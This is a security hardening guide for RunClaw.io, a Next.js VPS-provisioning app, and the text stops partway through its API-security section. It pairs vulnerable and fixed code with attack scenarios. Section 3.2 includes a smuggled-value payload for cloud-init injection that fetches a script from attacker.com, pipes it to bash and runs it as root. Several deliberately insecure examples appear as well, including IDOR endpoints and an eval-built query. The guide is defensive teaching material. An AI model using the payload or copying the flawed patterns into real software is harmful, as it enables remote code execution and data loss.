# RunClaw.io Application Security

## Architecture Context

RunClaw.io is a Next.js 14 application deployed on Vercel that provisions and manages Hetzner VPS instances. The stack includes:

- **Frontend/Backend**: Next.js 14 (App Router) on Vercel
- **Auth/Database**: Appwrite Cloud
- **Payments**: Stripe (subscriptions + webhooks)
- **Infrastructure**: Hetzner Cloud API (VPS provisioning), Cloudflare (DNS)
- **Provisioning**: Cloud-init templates with string replacement

This document catalogs every application-layer vulnerability class relevant to this architecture, provides vulnerable and fixed code patterns drawn from the spec, and assigns severity ratings with step-by-step attack scenarios.

---

## 1. Authentication Security

### 1.1 Appwrite Session Management Hardening

**Severity: High**

Appwrite Cloud manages sessions via its SDK. The default configuration is permissive. Every API route that touches user data must validate the session server-side, never trusting client-supplied user IDs.

**VULNERABLE pattern -- trusting the client-supplied userId:**

```typescript
// app/api/instances/route.ts
export async function GET(req: NextRequest) {
  const userId = req.headers.get('x-user-id'); // attacker-controlled
  const instances = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('user_id', userId),
  ]);
  return NextResponse.json(instances);
}
```

**FIXED pattern -- deriving userId from the validated Appwrite session:**

```typescript
// app/api/instances/route.ts
import { createSessionClient } from '@/lib/appwrite-server';

export async function GET(req: NextRequest) {
  const { account, databases } = createSessionClient(req);

  let user;
  try {
    user = await account.get();
  } catch {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const instances = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('user_id', user.$id),
  ]);
  return NextResponse.json(instances);
}
```

**Attack scenario:**
1. Attacker intercepts a request and replaces `x-user-id` with another user's ID.
2. The API returns the victim's instance list, leaking IP addresses, subdomains, and status.
3. With instance IDs exposed, the attacker chains to deletion or modification endpoints.

---

### 1.2 Session Cookie Configuration

**Severity: High**

Appwrite sets its own session cookie (`a_session_<projectId>`). When proxying or wrapping the session on the Next.js side, enforce the strictest cookie attributes.

**VULNERABLE pattern -- lax cookie settings:**

```typescript
// lib/auth.ts
response.cookies.set('session', sessionSecret, {
  path: '/',
  httpOnly: false,       // accessible to JS -- XSS exfiltrates it
  secure: false,         // transmitted over HTTP
  sameSite: 'lax',       // allows top-level navigations from foreign sites
  maxAge: 60 * 60 * 24 * 365, // 1-year lifetime
});
```

**FIXED pattern -- hardened cookie attributes:**

```typescript
// lib/auth.ts
response.cookies.set('__Host-session', sessionSecret, {
  path: '/',
  httpOnly: true,        // invisible to document.cookie
  secure: true,          // HTTPS only
  sameSite: 'strict',    // no cross-site transmission
  maxAge: 60 * 60 * 8,  // 8-hour maximum lifetime
});
```

**Key attributes explained:**

| Attribute | Value | Purpose |
|-----------|-------|---------|
| `__Host-` prefix | Required | Browser enforces `Secure`, `Path=/`, no `Domain` attribute -- prevents subdomain hijacking |
| `HttpOnly` | `true` | Prevents JavaScript access, blocking XSS-based session theft |
| `Secure` | `true` | Cookie only sent over HTTPS |
| `SameSite` | `Strict` | Cookie never sent on cross-site requests -- blocks CSRF |
| `maxAge` | 28800 (8h) | Limits window of exposure if cookie is stolen |

---

### 1.3 Session Timeout and Rotation

**Severity: Medium**

**Requirements:**
- **Idle timeout**: 30 minutes of inactivity invalidates the session.
- **Absolute timeout**: 8 hours maximum regardless of activity.
- **Rotation on privilege change**: Issue a new session token after login, role change, or password reset. Destroy the old token.

**VULNERABLE pattern -- no session rotation after login:**

```typescript
// app/api/auth/login/route.ts
export async function POST(req: NextRequest) {
  const { email, password } = await req.json();
  const session = await account.createEmailPasswordSession(email, password);
  // Session token reused from previous unauthenticated state
  return NextResponse.json({ success: true });
}
```

**FIXED pattern -- rotate session and set fresh cookie:**

```typescript
// app/api/auth/login/route.ts
export async function POST(req: NextRequest) {
  const { email, password } = await req.json();

  // Delete any existing session first
  try {
    await account.deleteSession('current');
  } catch {
    // No existing session -- continue
  }

  const session = await account.createEmailPasswordSession(email, password);

  const response = NextResponse.json({ success: true });
  response.cookies.set('__Host-session', session.secret, {
    path: '/',
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 60 * 60 * 8,
  });

  return response;
}
```

---

### 1.4 Brute Force Protection on Login Endpoint

**Severity: High**

Appwrite Cloud applies its own rate limits, but the Next.js API layer must add its own defense-in-depth limiting per IP and per account.

**FIXED pattern -- sliding window rate limiter:**

```typescript
// lib/rate-limit.ts
import { LRUCache } from 'lru-cache';

interface RateLimitEntry {
  count: number;
  firstAttempt: number;
}

const loginLimiter = new LRUCache<string, RateLimitEntry>({
  max: 10_000,
  ttl: 15 * 60 * 1000, // 15-minute window
});

const MAX_ATTEMPTS = 5;
const WINDOW_MS = 15 * 60 * 1000;

export function checkLoginRateLimit(key: string): {
  allowed: boolean;
  retryAfterMs: number;
} {
  const now = Date.now();
  const entry = loginLimiter.get(key);

  if (!entry) {
    loginLimiter.set(key, { count: 1, firstAttempt: now });
    return { allowed: true, retryAfterMs: 0 };
  }

  if (now - entry.firstAttempt > WINDOW_MS) {
    loginLimiter.set(key, { count: 1, firstAttempt: now });
    return { allowed: true, retryAfterMs: 0 };
  }

  if (entry.count >= MAX_ATTEMPTS) {
    const retryAfterMs = WINDOW_MS - (now - entry.firstAttempt);
    return { allowed: false, retryAfterMs };
  }

  entry.count += 1;
  loginLimiter.set(key, entry);
  return { allowed: true, retryAfterMs: 0 };
}
```

```typescript
// app/api/auth/login/route.ts
import { checkLoginRateLimit } from '@/lib/rate-limit';

export async function POST(req: NextRequest) {
  const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown';
  const { email, password } = await req.json();

  // Rate-limit by IP
  const ipCheck = checkLoginRateLimit(`ip:${ip}`);
  if (!ipCheck.allowed) {
    return NextResponse.json(
      { error: 'Too many login attempts. Try again later.' },
      {
        status: 429,
        headers: { 'Retry-After': String(Math.ceil(ipCheck.retryAfterMs / 1000)) },
      }
    );
  }

  // Rate-limit by email (prevents distributed brute force against one account)
  const emailCheck = checkLoginRateLimit(`email:${email.toLowerCase()}`);
  if (!emailCheck.allowed) {
    return NextResponse.json(
      { error: 'Too many login attempts. Try again later.' },
      {
        status: 429,
        headers: { 'Retry-After': String(Math.ceil(emailCheck.retryAfterMs / 1000)) },
      }
    );
  }

  // Proceed with authentication
  // ...
}
```

**Note on Vercel serverless**: LRU-based in-memory rate limiting resets between cold starts. For production, replace with Vercel KV (Redis), Upstash, or a dedicated rate-limit service. The pattern above works as defense-in-depth alongside Appwrite's own limits.

---

### 1.5 Account Lockout After Failed Attempts

**Severity: Medium**

After 10 consecutive failed login attempts for the same email, lock the account for 30 minutes. Store the lockout state in Appwrite (a `login_attempts` collection) so it survives serverless cold starts.

**FIXED pattern -- persistent lockout with Appwrite:**

```typescript
// lib/account-lockout.ts
import { databases } from '@/lib/appwrite-admin';
import { Query } from 'appwrite';

const LOCKOUT_COL = 'login_attempts';
const MAX_FAILURES = 10;
const LOCKOUT_DURATION_MS = 30 * 60 * 1000;

export async function checkAccountLockout(email: string): Promise<{
  locked: boolean;
  remainingMs: number;
}> {
  const normalized = email.toLowerCase();
  const docs = await databases.listDocuments(DB, LOCKOUT_COL, [
    Query.equal('email', normalized),
    Query.limit(1),
  ]);

  if (docs.total === 0) {
    return { locked: false, remainingMs: 0 };
  }

  const record = docs.documents[0];
  const lockedUntil = new Date(record.locked_until).getTime();
  const now = Date.now();

  if (record.failures >= MAX_FAILURES && lockedUntil > now) {
    return { locked: true, remainingMs: lockedUntil - now };
  }

  if (lockedUntil <= now && record.failures >= MAX_FAILURES) {
    // Lockout expired -- reset
    await databases.updateDocument(DB, LOCKOUT_COL, record.$id, {
      failures: 0,
      locked_until: null,
    });
  }

  return { locked: false, remainingMs: 0 };
}

export async function recordFailedLogin(email: string): Promise<void> {
  const normalized = email.toLowerCase();
  const docs = await databases.listDocuments(DB, LOCKOUT_COL, [
    Query.equal('email', normalized),
    Query.limit(1),
  ]);

  if (docs.total === 0) {
    await databases.createDocument(DB, LOCKOUT_COL, 'unique()', {
      email: normalized,
      failures: 1,
      locked_until: null,
    });
    return;
  }

  const record = docs.documents[0];
  const newFailures = record.failures + 1;
  const update: Record<string, unknown> = { failures: newFailures };

  if (newFailures >= MAX_FAILURES) {
    update.locked_until = new Date(Date.now() + LOCKOUT_DURATION_MS).toISOString();
  }

  await databases.updateDocument(DB, LOCKOUT_COL, record.$id, update);
}

export async function resetFailedLogins(email: string): Promise<void> {
  const normalized = email.toLowerCase();
  const docs = await databases.listDocuments(DB, LOCKOUT_COL, [
    Query.equal('email', normalized),
    Query.limit(1),
  ]);

  if (docs.total > 0) {
    await databases.updateDocument(DB, LOCKOUT_COL, docs.documents[0].$id, {
      failures: 0,
      locked_until: null,
    });
  }
}
```

---

### 1.6 Multi-Factor Authentication

**Severity: Medium (Recommendation)**

Appwrite Cloud supports TOTP-based MFA. Enforce MFA for:
- All admin accounts (mandatory).
- Users who manage production instances (strongly recommended).
- Any account that has provisioned more than 2 instances (prompt to enable).

**Implementation steps:**
1. Enable MFA in the Appwrite Console project settings.
2. After login, check `account.get()` for `mfa` status.
3. If MFA is enabled but not yet verified for this session, redirect to the TOTP verification page before granting access to the dashboard.
4. Provide MFA enrollment in the user settings page with QR code generation via Appwrite's `account.createMfaChallenge()`.

---

### 1.7 Password Policy Enforcement

**Severity: Medium**

Configure Appwrite project settings to enforce:
- Minimum length: 12 characters
- Must contain: uppercase, lowercase, digit, special character
- Block common passwords (Appwrite has a built-in dictionary check)
- No password reuse (last 5 passwords)

Additionally, validate on the client side before submission to provide immediate feedback, but always enforce server-side via Appwrite.

---

### 1.8 Account Enumeration Prevention

**Severity: Medium**

**VULNERABLE pattern -- different messages reveal account existence:**

```typescript
// app/api/auth/login/route.ts
try {
  await account.createEmailPasswordSession(email, password);
} catch (err: any) {
  if (err.code === 401) {
    return NextResponse.json({ error: 'Invalid password' }, { status: 401 });
  }
  if (err.code === 404) {
    return NextResponse.json({ error: 'Account not found' }, { status: 404 });
    //                                 ^^^ reveals that no account exists for this email
  }
}
```

**FIXED pattern -- identical error for all authentication failures:**

```typescript
// app/api/auth/login/route.ts
const GENERIC_AUTH_ERROR = 'Invalid email or password.';

try {
  const session = await account.createEmailPasswordSession(email, password);
  await resetFailedLogins(email);
  // set cookie, return success
} catch {
  await recordFailedLogin(email);
  // Identical message and status code regardless of failure reason
  return NextResponse.json({ error: GENERIC_AUTH_ERROR }, { status: 401 });
}
```

**Attack scenario:**
1. Attacker submits a list of emails to the login endpoint.
2. Different error messages reveal which emails have registered accounts.
3. Attacker now has a confirmed target list for credential stuffing or phishing.

Apply the same principle to the signup and password-reset endpoints: always return a generic success message like "If an account exists, a reset email has been sent."

---

## 2. Authorization & Access Control

### 2.1 IDOR Vulnerabilities in /api/instances/* Endpoints

**Severity: Critical**

Insecure Direct Object Reference (IDOR) is the most dangerous vulnerability class in this application. The provisioning API deals with real infrastructure -- a successful IDOR lets an attacker delete another user's server.

**VULNERABLE pattern -- fetching an instance by ID without ownership check:**

```typescript
// app/api/instances/[instanceId]/route.ts
export async function GET(
  req: NextRequest,
  { params }: { params: { instanceId: string } }
) {
  // CRITICAL: No ownership verification. Any authenticated user can read
  // any instance by guessing or enumerating the document ID.
  const instance = await databases.getDocument(DB, INSTANCES_COL, params.instanceId);
  return NextResponse.json(instance);
}
```

**Attack scenario (step by step):**
1. Attacker authenticates with their own account.
2. Attacker creates one instance and observes the document ID format (e.g., Appwrite's 20-char alphanumeric IDs).
3. Attacker enumerates or brute-forces nearby IDs (Appwrite IDs are not cryptographically random by default when using `unique()` -- they contain a timestamp component).
4. Attacker calls `GET /api/instances/VICTIM_INSTANCE_ID` and receives the victim's instance details: IP address, subdomain, Hetzner server ID, status, callback secret.
5. With the callback secret, the attacker can forge status updates. With the Hetzner server ID, if other endpoints are similarly unprotected, the attacker can delete the victim's server.

**FIXED pattern -- always filter by authenticated user:**

```typescript
// app/api/instances/[instanceId]/route.ts
import { createSessionClient } from '@/lib/appwrite-server';
import { Query } from 'appwrite';

export async function GET(
  req: NextRequest,
  { params }: { params: { instanceId: string } }
) {
  const { account, databases } = createSessionClient(req);

  let user;
  try {
    user = await account.get();
  } catch {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // Query with BOTH the document ID and the owner constraint
  const results = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('$id', params.instanceId),
    Query.equal('user_id', user.$id),
    Query.limit(1),
  ]);

  if (results.total === 0) {
    // Return 404, not 403 -- do not confirm the resource exists
    return NextResponse.json({ error: 'Instance not found' }, { status: 404 });
  }

  return NextResponse.json(results.documents[0]);
}
```

**Why `getDocument` is dangerous**: `databases.getDocument(DB, COL, id)` retrieves the document solely by its ID. There is no built-in ownership filter. You must either:
1. Use `listDocuments` with a `user_id` filter (preferred), or
2. Fetch with `getDocument` and then manually verify `doc.user_id === user.$id` before returning (acceptable but two-step).

Option 1 is preferred because it avoids ever loading unauthorized data into memory.

---

### 2.2 Broken Access Control on Instance Deletion

**Severity: Critical**

**VULNERABLE pattern -- delete by ID without ownership:**

```typescript
// app/api/instances/[instanceId]/route.ts
export async function DELETE(
  req: NextRequest,
  { params }: { params: { instanceId: string } }
) {
  const instance = await databases.getDocument(DB, INSTANCES_COL, params.instanceId);

  // Delete from Hetzner
  await hetznerClient.servers.del(instance.hetzner_server_id);

  // Delete DNS record
  await cloudflareClient.dns.records.delete(instance.dns_record_id, {
    zone_id: CF_ZONE_ID,
  });

  // Delete from database
  await databases.deleteDocument(DB, INSTANCES_COL, params.instanceId);

  return NextResponse.json({ success: true });
}
```

**Attack scenario:**
1. Attacker obtains (or guesses) a victim's instance document ID.
2. Attacker sends `DELETE /api/instances/VICTIM_ID`.
3. The victim's Hetzner server is destroyed, DNS record removed, and database entry deleted.
4. The victim loses their running VPS with all data.

**FIXED pattern:**

```typescript
// app/api/instances/[instanceId]/route.ts
export async function DELETE(
  req: NextRequest,
  { params }: { params: { instanceId: string } }
) {
  const { account, databases } = createSessionClient(req);

  let user;
  try {
    user = await account.get();
  } catch {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // Verify ownership before any destructive action
  const results = await databases.listDocuments(DB, INSTANCES_COL, [
    Query.equal('$id', params.instanceId),
    Query.equal('user_id', user.$id),
    Query.limit(1),
  ]);

  if (results.total === 0) {
    return NextResponse.json({ error: 'Instance not found' }, { status: 404 });
  }

  const instance = results.documents[0];

  // Now safe to proceed with deletion
  await hetznerClient.servers.del(instance.hetzner_server_id);
  await cloudflareClient.dns.records.delete(instance.dns_record_id, {
    zone_id: CF_ZONE_ID,
  });
  await databases.deleteDocument(DB, INSTANCES_COL, instance.$id);

  return NextResponse.json({ success: true });
}
```

---

### 2.3 Privilege Escalation via Appwrite Permission Misconfiguration

**Severity: High**

Appwrite uses document-level and collection-level permissions. A common mistake is setting collection permissions to `role:member` (any authenticated user) for read/write, which means any logged-in user can read or modify any document in the collection.

**VULNERABLE Appwrite collection permissions:**

```
Collection: instances
Permissions:
  Read:   role:member    <-- any authenticated user can read ALL documents
  Write:  role:member    <-- any authenticated user can update/delete ALL documents
```

**FIXED Appwrite collection permissions:**

```
Collection: instances
Document Security: ENABLED
Permissions:
  Read:   user:{userId}   <-- set per-document at creation time
  Write:  user:{userId}   <-- set per-document at creation time
```

**When creating a document, set per-document permissions:**

```typescript
// lib/instance-create.ts
import { Permission, Role } from 'appwrite';

await databases.createDocument(
  DB,
  INSTANCES_COL,
  'unique()',
  {
    user_id: user.$id,
    subdomain,
    status: 'provisioning',
    // ...
  },
  [
    Permission.read(Role.user(user.$id)),
    Permission.update(Role.user(user.$id)),
    Permission.delete(Role.user(user.$id)),
  ]
);
```

**Important**: Even with document-level permissions, the server-side Appwrite client (using the API key) bypasses all permissions. This is why API route code must always enforce ownership checks in application logic -- the admin SDK ignores Appwrite's permission system.

---

### 2.4 Admin vs User Role Separation

**Severity: High**

**Requirements:**
- Define Appwrite teams: `admins` and `users`.
- Admin endpoints (e.g., listing all instances, force-deleting, viewing billing across accounts) must verify team membership.
- Never use a single "is authenticated" check for admin actions.

**FIXED pattern -- admin middleware:**

```typescript
// lib/require-admin.ts
import { createSessionClient } from '@/lib/appwrite-server';
import { NextRequest, NextResponse } from 'next/server';

const ADMIN_TEAM_ID = process.env.APPWRITE_ADMIN_TEAM_ID!;

export async function requireAdmin(
  req: NextRequest
): Promise<{ authorized: true; userId: string } | NextResponse> {
  const { account, teams } = createSessionClient(req);

  let user;
  try {
    user = await account.get();
  } catch {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  try {
    await teams.get(ADMIN_TEAM_ID);
  } catch {
    // User is authenticated but not an admin -- return 404 to avoid
    // confirming the endpoint exists
    return NextResponse.json({ error: 'Not found' }, { status: 404 });
  }

  return { authorized: true, userId: user.$id };
}
```

---

### 2.5 API Key Scope Management

**Severity: High**

The Appwrite server API key used by the Next.js backend should have the minimum required scopes:

| Scope | Required | Reason |
|-------|----------|--------|
| `databases.read` | Yes | Read instance documents |
| `databases.write` | Yes | Create/update/delete instance documents |
| `users.read` | Yes | Verify user identity |
| `teams.read` | Yes | Check admin team membership |
| `users.write` | No | Should not modify user accounts from the API |
| `functions.write` | No | No server-side Appwrite functions needed |
| `storage.write` | No | No file uploads from API routes |

**Never use a key with full (`*`) scope in production.** If the key is compromised, the blast radius is limited to the granted scopes.

Rotate the Appwrite API key:
1. Generate a new key in the Appwrite Console with the minimum scopes above.
2. Update the `APPWRITE_API_KEY` environment variable in Vercel.
3. Trigger a redeployment.
4. Delete the old key from the Appwrite Console.

---

## 3. Input Validation & Injection

### 3.1 Subdomain Validation

**Severity: Critical**

The subdomain is user-supplied and flows into multiple dangerous contexts: DNS API calls, cloud-init YAML templates, database queries, and HTTP headers. It is the single most critical input to validate.

**VULNERABLE pattern -- insufficient regex:**

```typescript
// app/api/instances/route.ts
function validateSubdomain(subdomain: string): boolean {
  // Allows hyphens per spec, but does not block special characters
  // that bypass validation after Unicode normalization
  return /^[a-z0-9-]+$/.test(subdomain);
}
```

**Attack vectors this misses:**

1. **Unicode normalization bypass**: The character `\u2010` (hyphen, Unicode) normalizes to `-` (ASCII hyphen) in some contexts but passes through differently in others. An attacker submits `test\u2010\nruncmd` -- the regex sees it as non-matching, but if the system normalizes before use, the newline injection succeeds. Worse: some Unicode characters visually resemble ASCII letters but map to different bytes.

2. **Regex bypass with null bytes**: `test\x00.attacker.com` -- the null byte may terminate the string in C-based DNS libraries while JavaScript continues processing.

3. **DNS rebinding via crafted subdomains**: If the subdomain validation allows dots (it should not), an attacker could register `attacker.com.runclaw.io` which resolves to an attacker-controlled IP.

4. **Length-based attacks**: Extremely long subdomains can cause buffer issues in DNS resolvers.

**FIXED pattern -- strict allowlist with normalization:**

```typescript
// lib/validate-subdomain.ts

// Only ASCII lowercase alphanumeric and hyphens
// Must start and end with alphanumeric
// Length: 3-63 characters (DNS label limit)
const SUBDOMAIN_REGEX = /^[a-z0-9]([a-z0-9-]{1,61}[a-z0-9])?$/;

// Reserved subdomains that must never be allocated
const RESERVED_SUBDOMAINS = new Set([
  'www', 'api', 'app', 'admin', 'mail', 'smtp', 'ftp', 'ssh',
  'ns1', 'ns2', 'cdn', 'status', 'help', 'support', 'docs',
  'staging', 'dev', 'test', 'demo', 'beta', 'alpha',
  'login', 'auth', 'oauth', 'sso', 'dashboard',
  'billing', 'payment', 'stripe', 'webhook',
  'localhost', 'internal', 'private', 'intranet',
]);

export function validateSubdomain(input: string): {
  valid: true;
  subdomain: string;
} | {
  valid: false;
  error: string;
} {
  // Step 1: Reject non-string or empty input immediately
  if (typeof input !== 'string' || input.length === 0) {
    return { valid: false, error: 'Subdomain is required.' };
  }

  // Step 2: Normalize to NFC and convert to lowercase
  const normalized = input.normalize('NFC').toLowerCase();

  // Step 3: Reject if normalization changed the string (indicates Unicode tricks)
  if (normalized !== input.toLowerCase()) {
    return { valid: false, error: 'Subdomain contains invalid characters.' };
  }

  // Step 4: Reject any non-ASCII characters (catches all Unicode bypasses)
  if (!/^[\x20-\x7E]+$/.test(normalized)) {
    return { valid: false, error: 'Subdomain contains invalid characters.' };
  }

  // Step 5: Apply the strict regex
  if (!SUBDOMAIN_REGEX.test(normalized)) {
    return {
      valid: false,
      error: 'Subdomain must be 3-63 characters, start and end with a letter or digit, and contain only lowercase letters, digits, and hyphens.',
    };
  }

  // Step 6: Check reserved list
  if (RESERVED_SUBDOMAINS.has(normalized)) {
    return { valid: false, error: 'This subdomain is reserved.' };
  }

  // Step 7: Reject subdomains that look like they contain encoded attacks
  if (normalized.includes('--') && normalized.startsWith('xn--')) {
    // Punycode-encoded internationalized domain -- reject
    return { valid: false, error: 'Internationalized subdomains are not supported.' };
  }

  return { valid: true, subdomain: normalized };
}
```

---

### 3.2 Cloud-Init Template Injection

**Severity: Critical**

This is the most dangerous vulnerability in the entire application. The spec uses string replacement to inject the subdomain into a cloud-init YAML template. Cloud-init scripts run as root on the provisioned VPS. An injection here gives the attacker root-level remote code execution on every server they provision.

**VULNERABLE pattern -- naive string replacement:**

```typescript
// lib/cloud-init.ts
function generateCloudInit(subdomain: string, callbackUrl: string): string {
  const template = `#cloud-config
hostname: {SUBDOMAIN}.runclaw.io

runcmd:
  - echo "Setting up {SUBDOMAIN}"
  - curl -X POST {CALLBACK_URL}/api/callbacks/provision-complete \\
      -H "Content-Type: application/json" \\
      -d '{"subdomain": "{SUBDOMAIN}", "status": "ready"}'
`;

  return template
    .replace(/{SUBDOMAIN}/g, subdomain)
    .replace(/{CALLBACK_URL}/g, callbackUrl);
}
```

**Attack scenario (step by step):**

1. Attacker sets their subdomain to:
   ```
   test
   runcmd:
     - curl https://attacker.com/shell.sh | bash
   ```
   Or more compactly using YAML multiline:
   ```
   test\nruncmd:\n  - curl attacker.com/shell.sh | bash
   ```

2. After string replacement, the cloud-init becomes:
   ```yaml
   #cloud-config
   hostname: test
   runcmd:
     - curl attacker.com/shell.sh | bash.runclaw.io

   runcmd:
     - echo "Setting up test
   runcmd:
     - curl attacker.com/shell.sh | bash"
     - curl -X POST .../api/callbacks/provision-complete \
         -H "Content-Type: application/json" \
         -d '{"subdomain": "test
   runcmd:
     - curl attacker.com/shell.sh | bash", "status": "ready"}'
   ```

3. YAML parsers handle duplicate `runcmd` keys by using the last one. The attacker's `runcmd` block executes as root on the VPS.

4. `shell.sh` installs a reverse shell, cryptocurrency miner, or exfiltrates data from other VPS instances on the same network.

**FIXED pattern -- YAML-safe generation with strict validation:**

```typescript
// lib/cloud-init.ts
import YAML from 'yaml';
import { validateSubdomain } from './validate-subdomain';

export function generateCloudInit(
  subdomain: string,
  callbackUrl: string,
  callbackSecret: string
): string {
  // Step 1: Validate subdomain strictly BEFORE any template usage
  const validation = validateSubdomain(subdomain);
  if (!validation.valid) {
    throw new Error(`Invalid subdomain: ${validation.error}`);
  }

  // Step 2: Build the cloud-init as a structured object, not a string template
  const cloudConfig = {
    hostname: `${validation.subdomain}.runclaw.io`,
    runcmd: [
      `echo "Provisioning ${validation.subdomain}"`,
      [
        'curl', '-sf', '-X', 'POST',
        `${callbackUrl}/api/callbacks/provision-complete`,
        '-H', 'Content-Type: application/json',
        '-d', JSON.stringify({
          subdomain: validation.subdomain,
          secret: callbackSecret,
          status: 'ready',
        }),
      ],
    ],
    // ... other cloud-init configuration
  };

  // Step 3: Serialize with a proper YAML library -- no string interpolation
  return `#cloud-config\n${YAML.stringify(cloudConfig)}`;
}
```

**Key defenses:**
1. The subdomain is validated to contain only `[a-z0-9-]` -- no newlines, no YAML special characters.
2. The cloud-init is built as a JavaScript object and serialized with a YAML library, not assembled via string replacement.
3. The `runcmd` array uses the list form `['curl', '-sf', ...]` which prevents shell injection even if a value somehow contained special characters.

---

### 3.3 JSON Injection in Appwrite Document Fields

**Severity: Medium**

Fields like `status_message` and `details` may be populated from external sources (e.g., Hetzner API responses, callback payloads). If these values are rendered in the dashboard without sanitization, or if they contain control characters that break JSON parsing, they can cause issues.

**VULNERABLE pattern -- storing unsanitized external data:**

```typescript
// app/api/callbacks/provision-complete/route.ts
await databases.updateDocument(DB, INSTANCES_COL, instance.$id, {
  status: 'ready',
  status_message: callbackPayload.message, // attacker-controlled
  details: JSON.stringify(callbackPayload),  // raw external data
});
```

**FIXED pattern -- sanitize before storage:**

```typescript
// lib/sanitize.ts
export function sanitizeStatusMessage(input: unknown): string {
  if (typeof input !== 'string') return '';
  // Strip control characters, limit length
  return input
    .replace(/[\x00-\x1F\x7F]/g, '') // remove control chars
    .slice(0, 500);                    // enforce max length
}

export function sanitizeDetailsObject(input: unknown): string {
  if (typeof input !== 'object' || input === null) return '{}';
  // Re-serialize to strip any prototype pollution or unexpected types
  const safe = JSON.parse(JSON.stringify(input));
  // Remove any keys that should not be stored
  delete safe.secret;
  delete safe.callback_secret;
  return JSON.stringify(safe).slice(0, 5000);
}
```

---

### 3.4 Header Injection via Subdomain in DNS API Calls

**Severity: Medium**

If the subdomain is passed into HTTP headers (e.g., in the Cloudflare API `name` field or custom headers), newline characters can inject additional headers.

**VULNERABLE pattern:**

```typescript
// lib/cloudflare.ts
await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records`, {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${CF_TOKEN}`,
    'Content-Type': 'application/json',
    'X-Subdomain': subdomain, // If subdomain contains \r\n, header injection
  },
  body: JSON.stringify({
    type: 'A',
    name: `${subdomain}.runclaw.io`,
    content: serverIp,
  }),
});
```

**FIXED**: The strict subdomain validation from section 3.1 prevents this entirely. Always validate before use in any context.

---

### 3.5 SQL/NoSQL Injection in Appwrite Queries

**Severity: Low**

Appwrite uses its own query builder (`Query.equal`, `Query.search`, etc.) which parameterizes values internally. Direct injection is unlikely through the SDK. However:

- Never construct query strings manually.
- Never pass raw user input to `Query.search()` without length and character limits (search may support wildcard syntax).
- Always use the typed SDK methods.

**VULNERABLE pattern:**

```typescript
// Hypothetical manual query construction -- never do this
const query = `databases.listDocuments(DB, COL, ['equal("subdomain", "${userInput}")'])`;
eval(query); // catastrophic
```

**FIXED pattern:**

```typescript
const results = await databases.listDocuments(DB, INSTANCES_COL, [
  Query.equal('subdomain', validatedSubdomain),
  Query.equal('user_id', user.$id),
  Query.limit(1),
]);
```

---

## 4. API Security

### 4.1 Rate Limiting Strategy

**Severity: High**

Every endpoint needs rate limiting. Different endpoints need different limits.

**Rate limit tiers:**

| Endpoint | Limit | Window | Key |
|----------|-------|--------|-----|
| `POST /api/auth/login` | 5 | 15 min | IP + email |
| `POST /api/auth/signup` | 3 | 1 hour | IP |
| `POST /api/instances` | 5 | 1 hour | user_id |
| `DELETE /api/instances/*` | 10 | 1 hour | user_id |
| `GET /api/instances` | 60 | 1 min | user_id |
| `GET /api/instances/*` | 120 | 1 min | user_id |
| `POST /api/callbacks/*` | 100 | 1 min | IP |
| `POST /api/webhooks/stripe` | 100 | 1 min | IP |

**FIXED pattern -- middleware-based rate limiting:**

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

// Using Vercel KV for distributed rate limiting
import { kv } from '@vercel/kv';

interface RateLimitConfig {
  limit: number;
  windowSeconds: number;
}

const RATE_LIMITS: Record<string, RateLimitConfig> = {
  'POST:/api/auth/login': { limit: 5, windowSeconds: 900 },
  'POST:/api/auth/signup': { limit: 3, windowSeconds: 3600 },
  'POST:/api/instances': { limit: 5, windowSeconds: 3600 },
  'DELETE:/api/instances': { limit: 10, windowSeconds: 3600 },
  'GET:/api/instances': { limit: 60, windowSeconds: 60 },
  'POST:/api/callbacks': { limit: 100, windowSeconds: 60 },
  'POST:/api/webhooks': { limit: 100, windowSeconds: 60 },
};

function getConfig(method: string, path: string): RateLimitConfig | null {
  // Match most specific first, then fall back to prefix matches
  for (const [key, config] of Object.entries(RATE_LIMITS)) {
    const [m, p] = key.split(':');
    if (method === m && path.startsWith(p)) {
      return config;
    }
  }
  return null;
}

async function checkRateLimit(
  key: string,
  config: RateLimitConfig
): Promise<{ allowed: boolean; remaining: number; resetAt: number }> {
  const now = Math.floor(Date.now() / 1000);
  const windowKey = `rl:${key}:${Math.floor(now / config.windowSeconds)}`;

  const count = await kv.incr(windowKey);
  if (count === 1) {
    await kv.expire(windowKey, config.windowSeconds);
  }

  const remaining = Math.max(0, config.limit - count);
  const resetAt = (Math.floor(now / config.windowSeconds) + 1) * config.windowSeconds;

  return {
    allowed: count <= config.limit,
    remaining,
    resetAt,
  };
}

export async function middleware(req: NextRequest) {
  const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown';
  const config = getConfig(req.method, req.nextUrl.pathname);

  if (!config) {
    return NextResponse.next();
  }

  const result = await checkRateLimit(`${ip}:${req.method}:${req.nextUrl.pathname}`, config);

  if (!result.allowed) {
    return NextResponse.json(
      { error: 'Rate limit exceeded. Please try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': String(result.resetAt - Math.floor(Date.now() / 1000)),
          'X-RateLimit-Limit': String(config.limit),
          'X-RateLimit-Remaining': '0',
          'X-RateLimit-Reset': String(result.resetAt),
        },
      }
    );
  }

  const response = NextResponse.next();
  response.headers.set('X-RateLimit-Limit', String(config.limit));
  response.headers.set('X-RateLimit-Remaining', String(result.remaining));
  response.headers.set('X-RateLimit-Reset', String(result.resetAt));
  return response;
}

export const config = {
  matcher: '/api/:path*',
};
```

---

### 4.2 Request Size Limits

**Severity: Medium**

**FIXED pattern -- enforce body size limits in API routes:**

```typescript
// lib/parse-body.ts
const MAX_BODY_SIZE = 64 * 1024; // 64 KB for most endpoints

export async function parseJsonBody<T>(req: NextRequest): Promise<T> {
  const contentLength = req.headers.get('content-length');

  if (contentLength && parseInt(contentLength, 10) > MAX_BODY_SIZE) {
